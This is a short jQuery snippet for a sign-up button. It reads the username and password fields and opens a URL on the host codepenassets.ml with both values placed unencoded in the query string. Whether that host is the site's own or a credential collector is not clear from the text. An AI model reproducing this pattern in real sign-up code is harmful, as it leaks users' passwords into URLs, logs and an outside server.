$(function(){


  $(".signup").click(function(){

    //Home page sign up form
    $u = $(".signupform .username").val();
    $p = $(".signupform .password").val();

    window.open("https://codepenassets.ml/manager/register?u=" + $u + "&p=" + $p,"_self");


  });


});
